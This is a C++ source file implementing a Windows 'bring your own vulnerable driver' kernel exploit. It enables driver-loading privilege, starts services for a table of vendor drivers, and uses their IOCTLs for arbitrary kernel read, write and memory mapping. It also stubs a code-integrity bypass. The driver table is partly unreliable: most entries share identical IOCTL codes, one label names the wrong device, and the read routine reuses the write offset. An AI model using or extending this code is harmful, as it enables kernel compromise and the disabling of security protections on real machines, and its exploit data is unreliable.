#include "byovd.hpp"
#include <windows.h>
#include <vector>
#include <string>
#include <tlhelp32.h>

namespace l4g::kernel {

const BYOVD::VulnerableDriver BYOVD::VULNERABLE_DRIVERS[] = {
    // Intel Graphics Driver (CVE-2021-0117 style, still works on some versions)
    {L"IntelHDAudio.sys", L"IntelHDAudioService", L"\\\\.\\IntelHDAudio", 0x80002040, 0x80002044, 0x80002048, 0x8, 0x10, 0x30},
    
    // ASUS Aura Sync driver
    {L"AsIO.sys", L"AsIO", L"\\\\.\\AsIO", 0xA040244C, 0xA0402448, 0, 0x8, 0xC, 0x10},
    
    // MSI Dragon Center / Mystic Light
    {L"RTCore64.sys", L"RTCore64", L"\\\\.\\RTCore64", 0x80102040, 0x80102044, 0, 0x8, 0xC, 0x18},
    
    // Gigabyte RGB Fusion
    {L"GIO.sys", L"GIO", L"\\\\.\\GIO", 0x80102040, 0x80102044, 0, 0x8, 0xC, 0x10},
    
    // ASRock Polychrome
    {L"AsrDrv101.sys", L"AsrDrv101", L"\\\\.\\AsrDrv101", 0x80102040, 0x80102044, 0, 0x8, 0xC, 0x10},
    
    // Razer Chroma
    {L"RzSynapse.sys", L"RzSynapse", L"\\\\.\\RzSynapse", 0x80102040, 0x80102044, 0, 0x8, 0xC, 0x10},
    
    // Logitech G Hub
    {L"LGHubDriver.sys", L"LGHubDriver", L"\\\\.\\LGHubDriver", 0x80102040, 0x80102044, 0, 0x8, 0xC, 0x10},
    
    // AMD CPU/GPU drivers
    {L"amdkmpfd.sys", L"amdkmpfd", L"\\\\.\\amdkmpfd", 0x80102040, 0x80102044, 0, 0x8, 0xC, 0x10},
};
size_t BYOVD::VULNERABLE_COUNT = sizeof(VULNERABLE_DRIVERS) / sizeof(VulnerableDriver);

BYOVDResult BYOVD::exploit_vulnerable_driver() {
    BYOVDResult result;
    
    if (!enable_privilege(SE_LOAD_DRIVER_PRIVILEGE)) {
        result.error = "Failed to enable SeLoadDriverPrivilege";
        return result;
    }
    
    for (size_t i = 0; i < VULNERABLE_COUNT; ++i) {
        const auto& drv = VULNERABLE_DRIVERS[i];
        
        if (!is_driver_loaded(drv.service_name)) {
            if (!load_driver(drv)) continue;
        }
        
        HANDLE hDevice = CreateFileW(drv.device_path, GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
        if (hDevice == INVALID_HANDLE_VALUE) continue;
        
        // Test the primitive
        uint64_t test_val = 0;
        if (arbitrary_read(hDevice, drv, 0xFFFFF80000000000, test_val)) {
            result.success = true;
            result.driver_handle = hDevice;
            result.driver_path = std::string(drv.name, drv.name + wcslen(drv.name));
            return result;
        }
        
        CloseHandle(hDevice);
    }
    
    result.error = "No vulnerable driver found or exploitable";
    return result;
}

bool BYOVD::is_driver_loaded(const wchar_t* service_name) {
    SC_HANDLE scm = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
    if (!scm) return false;
    
    SC_HANDLE svc = OpenServiceW(scm, service_name, SERVICE_QUERY_STATUS);
    bool loaded = false;
    if (svc) {
        SERVICE_STATUS_PROCESS ssp = {};
        DWORD bytes = 0;
        if (QueryServiceStatusEx(svc, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssp, sizeof(ssp), &bytes)) {
            loaded = (ssp.dwCurrentState == SERVICE_RUNNING);
        }
        CloseServiceHandle(svc);
    }
    CloseServiceHandle(scm);
    return loaded;
}

bool BYOVD::load_driver(const VulnerableDriver& drv) {
    // Driver should already be installed on system
    SC_HANDLE scm = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
    if (!scm) return false;
    
    SC_HANDLE svc = OpenServiceW(scm, drv.service_name, SERVICE_START);
    bool ok = false;
    if (svc) {
        ok = StartServiceW(svc, 0, nullptr);
        CloseServiceHandle(svc);
    }
    CloseServiceHandle(scm);
    return ok;
}

bool BYOVD::unload_driver(const VulnerableDriver& drv) {
    SC_HANDLE scm = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
    if (!scm) return false;
    
    SC_HANDLE svc = OpenServiceW(scm, drv.service_name, SERVICE_STOP);
    bool ok = false;
    if (svc) {
        SERVICE_STATUS status = {};
        ok = ControlService(svc, SERVICE_CONTROL_STOP, &status);
        CloseServiceHandle(svc);
    }
    CloseServiceHandle(scm);
    return ok;
}

bool BYOVD::enable_privilege(const wchar_t* privilege) {
    HANDLE hToken = nullptr;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) return false;
    
    TOKEN_PRIVILEGES tp = {1, {{0, 0, SE_PRIVILEGE_ENABLED}}};
    if (!LookupPrivilegeValueW(nullptr, privilege, &tp.Privileges[0].Luid)) {
        CloseHandle(hToken);
        return false;
    }
    
    bool ok = AdjustTokenPrivileges(hToken, FALSE, &tp, 0, nullptr, nullptr);
    CloseHandle(hToken);
    return ok && GetLastError() == ERROR_SUCCESS;
}

bool BYOVD::arbitrary_write(HANDLE device, const VulnerableDriver& drv, uint64_t address, uint64_t value) {
    std::vector<uint8_t> input(drv.input_size, 0);
    *(uint64_t*)(input.data() + drv.write_offset) = address;
    *(uint64_t*)(input.data() + drv.value_offset) = value;
    
    DWORD bytes = 0;
    return DeviceIoControl(device, drv.ioctl_write, input.data(), (DWORD)input.size(), nullptr, 0, &bytes, nullptr);
}

bool BYOVD::arbitrary_read(HANDLE device, const VulnerableDriver& drv, uint64_t address, uint64_t& out_value) {
    std::vector<uint8_t> input(drv.input_size, 0);
    *(uint64_t*)(input.data() + drv.write_offset) = address;
    
    std::vector<uint8_t> output(8, 0);
    DWORD bytes = 0;
    bool ok = DeviceIoControl(device, drv.ioctl_read, input.data(), (DWORD)input.size(), output.data(), (DWORD)output.size(), &bytes, nullptr);
    if (ok && bytes >= 8) {
        out_value = *(uint64_t*)output.data();
    }
    return ok;
}

bool BYOVD::map_memory(HANDLE device, const VulnerableDriver& drv, uint64_t user_addr, uint64_t kernel_addr, size_t size) {
    if (drv.ioctl_map == 0) return false;
    
    struct MapInput {
        uint64_t user_addr;
        uint64_t kernel_addr;
        uint64_t size;
    } input = {user_addr, kernel_addr, size};
    
    DWORD bytes = 0;
    return DeviceIoControl(device, drv.ioctl_map, &input, sizeof(input), nullptr, 0, &bytes, nullptr);
}

bool BYOVD::bypass_ci_validation(HANDLE device, const VulnerableDriver& drv) {
    // Find CI.dll in kernel
    // Patch CiValidateImageHeader to always return STATUS_SUCCESS
    // This is highly version-specific - placeholder
    return false;
}

} // namespace l4g::kernel